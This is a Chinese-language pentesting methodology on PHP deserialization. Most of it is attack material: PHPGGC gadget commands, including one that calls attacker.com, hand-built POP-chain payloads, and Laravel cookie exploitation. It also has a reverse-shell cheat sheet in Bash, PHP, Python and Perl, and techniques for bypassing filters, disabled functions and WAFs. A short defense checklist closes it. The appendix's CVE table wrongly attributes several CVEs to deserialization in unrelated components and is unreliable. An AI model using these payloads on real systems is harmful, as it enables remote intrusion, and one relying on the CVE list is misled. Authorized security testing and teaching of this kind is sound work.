# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 PHP 反序列化漏洞测试与利用流程。通过本方法论，测试人员能够系统性地检测 PHP 应用中的反序列化漏洞，并构造合适的 Payload 进行验证和利用，包括常见框架和 CMS 的反序列化漏洞测试方法。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 `unserialize()` 函数的 PHP 应用
- 使用 Session 序列化的 PHP 应用
- 使用 Laravel、ThinkPHP 等框架的应用
- 使用 WordPress、Discuz 等 CMS 的系统
- 接收用户可控序列化数据的 API 接口

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 PHP 应用安全审计的顾问
- 负责 PHP 应用安全开发的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：PHP 反序列化漏洞测试

### 2.1 技术介绍

PHP 反序列化漏洞是指当应用使用 `unserialize()` 函数反序列化来自不可信来源的数据时，攻击者可以构造恶意序列化数据，在反序列化过程中触发魔术方法执行任意代码。

**漏洞原理：**
- PHP 的 `unserialize()` 函数会将序列化字符串还原为对象
- 在对象创建过程中会调用魔术方法（`__wakeup()`、`__destruct()` 等）
- 如果这些魔术方法中存在危险操作（如 `eval()`、`system()`），可能被利用
- 通过组合多个类的魔术方法形成 POP（Property Oriented Programming）链

**常见魔术方法：**
- `__wakeup()` - 反序列化时自动调用
- `__destruct()` - 对象销毁时自动调用
- `__toString()` - 对象转为字符串时调用
- `__invoke()` - 对象被当作函数调用时执行
- `__get()` / `__set()` - 访问不存在属性时调用

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **用户输入** | 接收序列化参数 | `unserialize($_GET['data'])` |
| **Cookie 数据** | 用户状态存储 | `unserialize($_COOKIE['user'])` |
| **Session 处理** | 自定义 Session 处理器 | Session 数据反序列化 |
| **缓存系统** | Redis/Memcached 缓存 | 缓存数据反序列化 |
| **文件上传** | 序列化文件上传 | 上传的文件被反序列化 |
| **API 接口** | 接收序列化请求体 | API 接受序列化数据 |
| **CMS 插件** | 第三方插件数据处理 | 插件反序列化用户数据 |
| **框架功能** | 框架内置功能 | 如 Laravel 的 Cookie 序列化 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**反序列化点识别：**

1. **识别 PHP 序列化特征**
   ```bash
   # PHP 序列化格式
   # O:<长度>:"<类名>":<属性数 >:{<属性>}
   # 例如：O:4:"User":2:{s:8:"username";s:5:"admin";}
   
   # 检查请求参数
   curl "https://target.com/page.php?user=O:4:%22User%22:1:{s:4:%22name%22;s:5:%22admin%22;}"
   
   # 检查 Cookie
   curl -H "Cookie: data=O:4:%22User%22:1:{s:4:%22name%22;s:5:%22admin%22;}" https://target.com
   
   # 检查 POST 数据
   curl -X POST https://target.com/api.php \
     -d "data=O:4:%22User%22:1:{s:4:%22name%22;s:5:%22admin%22;}"
   ```

2. **使用工具探测**
   ```bash
   # 使用 phpggc 生成探测 Payload
   php phpggc.php monolog/rce1 'phpinfo()'
   
   # 使用 Burp Suite 插件
   # - PHP Object Injection
   # - Intruder  payloads
   ```

3. **时间延迟探测**
   ```bash
   # 生成时间延迟 Payload
   php phpggc.php monolog/rce1 'sleep(5)'
   # 输出：O:32:"Monolog\Handler\BufferHandler":7:{...}
   
   # 发送并观察响应时间
   curl -X POST https://target.com/api.php \
     -d "data=O:32:%22Monolog..."
   ```

4. **DNS/HTTP 外带探测**
   ```bash
   # 生成外带 Payload
   php phpggc.php monolog/rce1 'curl http://your-dnslog.com'
   
   # 检查 DNSLog 是否收到请求
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **搜索反序列化相关代码**
   ```php
   // 危险模式：直接反序列化用户输入
   $data = unserialize($_GET['data']);
   $data = unserialize($_POST['data']);
   $data = unserialize($_COOKIE['data']);
   
   // 危险模式：文件内容反序列化
   $data = unserialize(file_get_contents($_FILES['upload']['tmp_name']));
   
   // 危险模式：数据库内容反序列化
   $row = $db->query("SELECT data FROM cache WHERE id=1")->fetch();
   $data = unserialize($row['data']);
   ```

2. **查找 POP 链**
   ```php
   // 查找包含魔术方法的类
   grep -r "__wakeup\|__destruct\|__toString\|__invoke" *.php
   
   // 查找危险函数调用
   grep -r "system\|exec\|passthru\|shell_exec\|eval\|assert" *.php
   ```

3. **检查框架配置**
   ```php
   // Laravel 检查
   // 检查 config/session.php 中的 serialize 驱动
   
   // ThinkPHP 检查
   // 检查是否使用默认的反序列化配置
   ```

### 2.4 漏洞利用方法

#### 2.4.1 使用 PHPGGC 工具

**PHPGGC 常用 Gadget：**

```bash
# 列出所有可用 Gadget
php phpggc.php -l

# 生成 Payload
php phpggc.php <Gadget> <Command>

# 常用 Gadget 示例
php phpggc.php monolog/rce1 'phpinfo()'
php phpggc.php monolog/rce1 'system("id")'
php phpggc.php laravel/rce1 'touch /tmp/pwned'
php phpggc.php symfony/rce1 'curl http://attacker.com'
php phpggc.php wordpress/wp-developer-tools/rce1 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

**常见 Gadget 适用场景：**

| Gadget | 框架/库 | 描述 |
|-------|--------|------|
| **monolog/rce1** | Monolog | 日志库反序列化 |
| **monolog/rce2** | Monolog | Monolog 另一种利用方式 |
| **laravel/rce1** | Laravel | Laravel 框架反序列化 |
| **symfony/rce1** | Symfony | Symfony 框架反序列化 |
| **swiftmailer/rce1** | SwiftMailer | 邮件库反序列化 |
| **wordpress/wp-developer-tools/rce1** | WordPress | WP 开发者工具 |
| **guzzle/rce1** | Guzzle | HTTP 客户端库 |
| **phpunit/rce1** | PHPUnit | 测试框架反序列化 |

#### 2.4.2 手动构造 Payload

**简单 Payload 示例：**
```php
<?php
class User {
    public $name;
    
    function __destruct() {
        system($this->name);
    }
}

// 创建恶意对象
$user = new User();
$user->name = "id";

// 生成序列化字符串
echo serialize($user);
// 输出：O:4:"User":1:{s:4:"name";s:2:"id";}
?>
```

**复杂 POP 链示例：**
```php
<?php
class A {
    public $obj;
    
    function __destruct() {
        $this->obj->execute();
    }
}

class B {
    public $cmd;
    
    function execute() {
        system($this->cmd);
    }
}

// 构建 POP 链
$a = new A();
$b = new B();
$b->cmd = "id";
$a->obj = $b;

// 生成 Payload
echo urlencode(serialize($a));
?>
```

#### 2.4.3 Laravel Cookie 反序列化

**检测 Laravel：**
```bash
# 检查 Cookie
curl -I https://target.com
# 如果 XSRF-TOKEN Cookie 存在，可能是 Laravel

# Laravel 5.4.23 之前使用序列化
# 检查 Cookie 是否包含 O: 前缀
```

**利用 Laravel 漏洞：**
```bash
# 使用 PHPGGC 生成 Payload
php phpggc.php laravel/rce1 'phpinfo()' --cookie

# 设置 Cookie
curl -H "Cookie: XSRF-TOKEN=生成的 Payload" https://target.com
```

#### 2.4.4 反弹 Shell Payload

```php
// Bash 反弹 Shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

// PHP 反弹 Shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'");

// Python 反弹 Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

// Perl 反弹 Shell
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过字符过滤

**方法 1：使用替代函数**
```php
// 如果 system 被过滤
system("id");     // 被过滤
passthru("id");   // 替代
exec("id");       // 替代
shell_exec("id"); // 替代
`id`;             // 反引号替代
```

**方法 2：字符串拼接**
```php
// 如果空格被过滤
sys/* 空格 */tem("id");

// 使用变量拼接
$cmd = "sy" . "stem";
$cmd("id");
```

#### 2.5.2 绕过函数禁用

**方法 1：使用未禁用的函数**
```php
// 检查可用函数
<?php
$disabled = explode(',', ini_get('disable_functions'));
echo "Disabled: " . implode(', ', $disabled);
?>

// 使用未禁用的函数
// 如果 system 被禁用，尝试 passthru、exec 等
```

**方法 2：使用扩展**
```php
// 使用 COM 扩展（Windows）
$com = new COM('WScript.Shell');
$com->Exec('calc.exe');

// 使用 FFI 扩展（PHP 7.4+）
// 直接调用系统 API
```

#### 2.5.3 绕过 WAF

**方法 1：编码绕过**
```php
// Base64 编码
$cmd = base64_decode('aWQ=');  // id
system($cmd);

// URL 编码
$cmd = urldecode('%69%64');  // id
system($cmd);
```

**方法 2：使用不同 Gadget**
```bash
# 如果某个 Gadget 被拦截，尝试其他
php phpggc.php monolog/rce2 'cmd'
php phpggc.php swiftmailer/rce1 'cmd'
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Gadget | Payload 示例 | 说明 |
|-----|--------|------------|------|
| **命令执行** | monolog/rce1 | `php phpggc.php monolog/rce1 "id"` | 基础命令执行 |
| **时间延迟** | monolog/rce1 | `php phpggc.php monolog/rce1 "sleep 5"` | 盲测使用 |
| **外带数据** | monolog/rce1 | `php phpggc.php monolog/rce1 "curl http://dnslog"` | DNS/HTTP 外带 |
| **反弹 Shell** | laravel/rce1 | `php phpggc.php laravel/rce1 "bash payload"` | 建立反向 Shell |
| **WordPress** | wp-developer-tools/rce1 | `php phpggc.php wordpress/...` | WordPress 利用 |

## 3.2 常见 PHP 反序列化漏洞 CVE

| CVE | 受影响组件 | 描述 |
|-----|-----------|------|
| **CVE-2019-6977** | PHP-GD | 图像拖拽处理反序列化 |
| **CVE-2018-19207** | Laravel | Cookie 反序列化 RCE |
| **CVE-2017-9841** | PHPUnit | 测试框架反序列化 |
| **CVE-2018-1000002** | PHPMailer | 邮件库反序列化 |
| **CVE-2019-9219** | TYPO3 | CMS 反序列化 |

## 3.3 PHP 反序列化安全检查清单

- [ ] 避免使用 unserialize() 处理用户输入
- [ ] 使用 JSON 替代序列化
- [ ] 实施数据签名验证
- [ ] 使用 allowed_classes 选项
- [ ] 升级有漏洞的框架/库
- [ ] 禁用危险函数
- [ ] 监控异常反序列化行为
- [ ] 定期扫描代码漏洞

## 3.4 防御建议

1. **避免反序列化**：使用 JSON 等安全格式替代
2. **allowed_classes**：限制可反序列化的类
   ```php
   // 只允许特定类
   $data = unserialize($str, ["allowed_classes" => ["User", "Product"]]);
   
   // 完全禁止类
   $data = unserialize($str, ["allowed_classes" => false]);
   ```
3. **数据签名**：对序列化数据签名验证
   ```php
   $signature = hash_hmac('sha256', $data, $key);
   // 验证时先检查签名
   ```
4. **输入验证**：验证所有输入来源
5. **最小权限**：PHP 进程使用最小权限运行
6. **函数禁用**：禁用危险函数
7. **框架更新**：及时更新框架和依赖
8. **安全监控**：监控异常反序列化行为
